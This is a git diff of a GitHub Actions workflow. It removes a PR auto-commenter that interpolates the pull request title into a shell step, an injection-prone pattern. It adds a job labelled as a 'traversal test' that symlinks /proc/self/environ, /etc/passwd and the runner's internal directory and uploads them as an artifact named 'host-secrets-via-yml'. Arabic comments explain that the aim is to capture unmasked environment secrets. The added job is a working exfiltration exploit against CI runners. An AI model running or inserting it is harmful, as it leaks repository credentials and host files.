@@ -1,14 +1,25 @@
-name: Auto-Comment on PR
-on:
-  pull_request_target:
-    types: [opened]
-permissions:
-  issues: write
-  pull-requests: write
+name: Symlink Artifact Traversal Test
+on: [push]
 jobs:
-  comment:
+  test:
     runs-on: ubuntu-latest
     steps:
-      - name: Process PR Title
+      - name: Create Symlinks to Host Secrets
         run: |
-          echo "Reviewing pull request titled: ${{ github.event.pull_request.title }}"
+          # 1. إنشاء وصلة رمزية تشير إلى متغيرات البيئة الخام (التي لم يتم عمل Masking لها)
+          ln -s /proc/self/environ raw_env_link
+          
+          # 2. إنشاء وصلة رمزية تشير إلى ملف passwd الخاص بنظام التشغيل المضيف
+          ln -s /etc/passwd host_passwd_link
+          
+          # 3. إنشاء وصلة رمزية تشير إلى مجلد الـ Runner الداخلي
+          ln -s /home/runner/runners runner_internals_link
+
+      - name: Upload Artifacts (Triggering the Traversal)
+        uses: actions/upload-artifact@v4
+        with:
+          name: host-secrets-via-yml
+          path: |
+            raw_env_link
+            host_passwd_link
+            runner_internals_link
